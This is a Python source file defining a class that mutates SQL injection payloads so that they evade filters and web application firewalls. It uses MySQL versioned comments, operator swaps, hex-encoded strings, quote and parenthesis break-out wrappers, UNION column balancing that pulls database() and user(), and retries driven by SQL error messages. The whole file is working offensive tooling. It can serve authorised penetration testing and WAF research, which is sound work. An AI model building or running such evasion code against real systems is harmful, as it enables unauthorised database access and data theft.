import random
import re

class ASTMutator:
    def __init__(self):
        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA"]
        self.strategies = {
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "junk_fill": self._junk_filling,
            "context_aware": self._context_aware_mutation
        }

    def mutate(self, payload, error_msg=None, intensity=1):
        mutated = str(payload)
        
        # 1. Error-Based Feedback: Apply specific fixes based on SQL error
        if error_msg:
            mutated = self._apply_error_feedback(mutated, error_msg)
            
        # 2. Context-Aware Mutation: Detect and wrap payload if needed
        mutated = self._context_aware_wrap(mutated)
        
        # 3. Standard Mutations with Dynamic Intensity
        num_mutations = random.randint(1, 2) * intensity
        available_strats = list(self.strategies.keys())
        
        for _ in range(num_mutations):
            strat = random.choice(available_strats)
            mutated = self.strategies[strat](mutated)
            
        return mutated

    def _apply_error_feedback(self, payload, error):
        """Applies specific mutations based on SQL error messages."""
        error = error.lower()
        # Column count mismatch
        if "column" in error and ("count" in error or "match" in error):
            if "UNION SELECT" in payload.upper():
                # Add more columns to UNION
                parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    cols = parts[2].split(",")
                    cols.append("NULL")
                    return f"{parts[0]}{parts[1]}{','.join(cols)}"
        
        # Quote mismatch or syntax error near quote
        if "syntax" in error and ("'" in error or '"' in error):
            if "'" in payload: return payload.replace("'", "''")
            
        return payload

    def _context_aware_wrap(self, payload):
        """Wraps payload based on detected context (quotes, brackets)."""
        if random.random() > 0.7:
            wrappers = [
                ("'", "'"),
                ('"', '"'),
                ("') ", " --"),
                ('") ', " --"),
                (")) ", " --")
            ]
            prefix, suffix = random.choice(wrappers)
            if not payload.startswith(prefix):
                return prefix + payload + suffix
        return payload

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0=~0", "8<=>8"],
            r"\bOR\b": ["||", "XOR"],
            r"\bAND\b": ["&&"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        junk = ["bypass", "attack_unit", "audit"]
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload

    def _context_aware_mutation(self, payload):
        mutated = str(payload)
        
        # 1. Quote Alteration: Swap quotes or use hex for strings
        if "'" in mutated:
            rand = random.random()
            if rand < 0.4:
                mutated = mutated.replace("'", '"')
            elif rand < 0.7:
                # Replace string literals with hex if they are in quotes
                def to_hex(match):
                    p1 = match.group(1)
                    if p1:
                        return f"0x{p1.encode().hex()}"
                    return match.group(0)
                mutated = re.sub(r"'([^']*)'", to_hex, mutated)

        # 2. Comment Wrapping: Wrap keywords or parts of the payload
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                coin = random.random()
                if coin < 0.3:
                    mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
                elif coin < 0.6:
                    mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)

        # 3. Space/Separator Mutation
        if " " in mutated:
            separators = ["/**/", "/*!*/", "+", "%20"]
            sep = random.choice(separators)
            mutated = mutated.replace(" ", sep)

        return mutated
